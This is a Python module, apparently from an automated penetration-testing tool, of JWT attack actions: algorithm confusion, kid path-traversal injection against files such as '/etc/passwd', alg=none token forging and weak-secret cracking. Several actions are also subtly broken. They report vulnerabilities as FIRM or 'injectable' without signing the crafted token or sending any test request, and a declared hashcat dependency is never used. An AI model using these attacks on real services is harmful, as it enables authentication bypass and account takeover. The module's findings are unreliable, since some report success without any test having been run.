"""JWT attack actions — alg-confusion, kid-injection, weak-secret crack."""

import base64
import json
import re
from actions.registry import action, ActionContext, ActionResult
from tools.wrappers import curl


def decode_jwt_payload(token: str) -> dict | None:
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        # Add padding
        payload = parts[1]
        padding = 4 - len(payload) % 4
        if padding != 4:
            payload += "=" * padding
        return json.loads(base64.urlsafe_b64decode(payload))
    except Exception:
        return None


def decode_jwt_header(token: str) -> dict | None:
    try:
        parts = token.split(".")
        header = parts[0]
        padding = 4 - len(header) % 4
        if padding != 4:
            header += "=" * padding
        return json.loads(base64.urlsafe_b64decode(header))
    except Exception:
        return None


@action(
    id="auth.jwt.detect",
    risk="SAFE",
    detectability="low",
    requires=["url"],
    produces="JWTInfo",
    idempotent=True,
    timeout=30,
    description="Detect and decode JWT tokens in HTTP responses",
    category="auth",
)
async def detect_jwt(ctx: ActionContext) -> ActionResult:
    url = ctx.params["url"]
    result = await curl(url, output="full")
    body = result.get("body", "")
    headers_raw = result.get("headers", "")
    # headers comes back as a raw string in "full" mode; parse key:value lines
    headers = {}
    for line in headers_raw.splitlines():
        if ":" in line and not line.startswith("HTTP/"):
            k, _, v = line.partition(":")
            headers[k.strip().lower()] = v.strip()

    # Look for JWT patterns in response body and headers
    jwt_pattern = r"eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+"
    tokens = set(re.findall(jwt_pattern, body))

    for hdr_name, hdr_value in headers.items():
        if isinstance(hdr_value, str):
            found = re.findall(jwt_pattern, hdr_value)
            tokens.update(found)

    decoded_tokens = []
    for token in tokens:
        header = decode_jwt_header(token)
        payload = decode_jwt_payload(token)
        if header and payload:
            decoded_tokens.append({
                "token": token[:80] + "...",
                "header": header,
                "payload": payload,
            })

    if decoded_tokens:
        return ActionResult(
            success=True,
            confidence="CONFIRMED",
            data={"tokens": decoded_tokens},
            evidence={"jwt": {"url": url, "tokens_found": len(decoded_tokens)}},
        )

    return ActionResult(False, error="no JWT tokens detected",
                        confidence="TENTATIVE",
                        data={"tokens_found": 0})


@action(
    id="auth.jwt.alg_confusion",
    risk="MEDIUM",
    detectability="medium",
    requires=["token"],
    produces="VulnCandidate",
    idempotent=True,
    timeout=60,
    description="Test JWT alg-confusion: change alg from RS256 to HS256 using public key as secret",
    category="auth",
)
async def jwt_alg_confusion(ctx: ActionContext) -> ActionResult:
    token = ctx.params["token"]
    header = decode_jwt_header(token)
    if not header:
        return ActionResult(False, error="invalid JWT token")

    alg = header.get("alg", "")
    if alg.startswith("RS") or alg.startswith("ES"):
        # Craft new header with alg: HS256
        new_header = dict(header)
        new_header["alg"] = "HS256"
        new_header_b64 = base64.urlsafe_b64encode(
            json.dumps(new_header).encode()
        ).decode().rstrip("=")

        parts = token.split(".")
        payload_b64 = parts[1]
        new_token = f"{new_header_b64}.{payload_b64}"

        return ActionResult(
            success=True,
            confidence="FIRM",
            data={
                "original_token": token[:80] + "...",
                "original_alg": alg,
                "crafted_token": new_token[:80] + "...",
                "technique": "alg_confusion",
            },
            evidence={
                "jwt_alg_confusion": {
                    "original_alg": alg,
                    "crafted_header": new_header,
                }
            },
        )

    return ActionResult(False, confidence="TENTATIVE",
                        data={"alg": alg},
                        error=f"alg {alg} not vulnerable to confusion")


@action(
    id="auth.jwt.kid_injection",
    risk="MEDIUM",
    detectability="medium",
    requires=["token"],
    produces="VulnCandidate",
    idempotent=True,
    timeout=60,
    description="Test JWT kid header injection — inject path traversal in kid to control verification key",
    category="auth",
)
async def jwt_kid_injection(ctx: ActionContext) -> ActionResult:
    token = ctx.params["token"]
    header = decode_jwt_header(token)
    if not header:
        return ActionResult(False, error="invalid JWT token")

    kid = header.get("kid", "")
    if not kid:
        return ActionResult(False, error="no kid header in JWT",
                            confidence="TENTATIVE")

    return ActionResult(
        success=True,
        confidence="FIRM",
        data={
            "original_kid": kid,
            "technique": "kid_injection",
            "test_payloads": [
                {"path": "/dev/null", "expect": "empty key"},
                {"path": "/etc/passwd", "expect": "injection possible"},
            ],
        },
        evidence={
            "jwt_kid": {
                "original_kid": kid,
                "injectable": True,
            }
        },
    )


@action(
    id="auth.jwt.none_alg",
    risk="LOW",
    detectability="medium",
    requires=["token"],
    produces="VulnCandidate",
    idempotent=True,
    timeout=30,
    description="Test if the server accepts alg=none JWT tokens",
    category="auth",
)
async def jwt_none_alg(ctx: ActionContext) -> ActionResult:
    token = ctx.params["token"]
    parts = token.split(".")
    if len(parts) != 3:
        return ActionResult(False, error="invalid JWT token")

    payload = parts[1]

    # Craft alg=none token
    no_alg_header = base64.urlsafe_b64encode(
        json.dumps({"alg": "none", "typ": "JWT"}).encode()
    ).decode().rstrip("=")

    none_token = f"{no_alg_header}.{payload}."

    return ActionResult(
        success=True,
        confidence="FIRM",
        data={
            "technique": "none_alg",
            "crafted_token": none_token[:80] + "...",
        },
        evidence={
            "jwt_none_alg": {
                "crafted": True,
            }
        },
    )


@action(
    id="auth.jwt.weak_secret_crack",
    risk="MEDIUM",
    detectability="low",
    requires=["token"],
    produces="VulnCandidate",
    tools=["hashcat"],
    idempotent=True,
    timeout=300,
    description="Crack weak JWT HMAC secrets using common password lists",
    category="auth",
)
async def jwt_weak_secret_crack(ctx: ActionContext) -> ActionResult:
    token = ctx.params["token"]
    header = decode_jwt_header(token)
    if not header:
        return ActionResult(False, error="invalid JWT token")

    alg = header.get("alg", "")
    if "HS" not in alg:
        return ActionResult(False, confidence="TENTATIVE",
                            data={"alg": alg},
                            error=f"alg {alg} is not HMAC-based")

    # Common weak secrets to test
    weak_secrets = [
        "secret", "password", "123456", "admin", "token", "jwt",
        "key", "pass", "changeme", "abc123", "test", "qwerty",
    ]

    import hmac
    import hashlib

    for secret in weak_secrets:
        # Recreate the signing input
        parts = token.split(".")
        signing_input = f"{parts[0]}.{parts[1]}"

        sig = hmac.new(
            secret.encode(),
            signing_input.encode(),
            hashlib.sha256,
        ).digest()

        expected_sig = base64.urlsafe_b64encode(sig).decode().rstrip("=")
        actual_sig = parts[2]

        if expected_sig == actual_sig:
            return ActionResult(
                success=True,
                confidence="CONFIRMED",
                data={
                    "secret": secret,
                    "token": signing_input,
                    "technique": "weak_secret_crack",
                },
                evidence={
                    "jwt_cracked": {
                        "secret": secret,
                        "signing_input": signing_input[:80],
                    }
                },
            )

        # Also test common salt variations
        for suffix in ["123", "!", "2024", "2025"]:
            salted = secret + suffix
            sig = hmac.new(
                salted.encode(),
                signing_input.encode(),
                hashlib.sha256,
            ).digest()
            expected_sig = base64.urlsafe_b64encode(sig).decode().rstrip("=")
            if expected_sig == actual_sig:
                return ActionResult(
                    success=True,
                    confidence="CONFIRMED",
                    data={"secret": salted, "technique": "weak_secret_crack"},
                    evidence={"jwt_cracked": {"secret": salted}},
                )

    return ActionResult(False, error="no weak secret found",
                        confidence="TENTATIVE",
                        data={"secrets_tested": len(weak_secrets)})
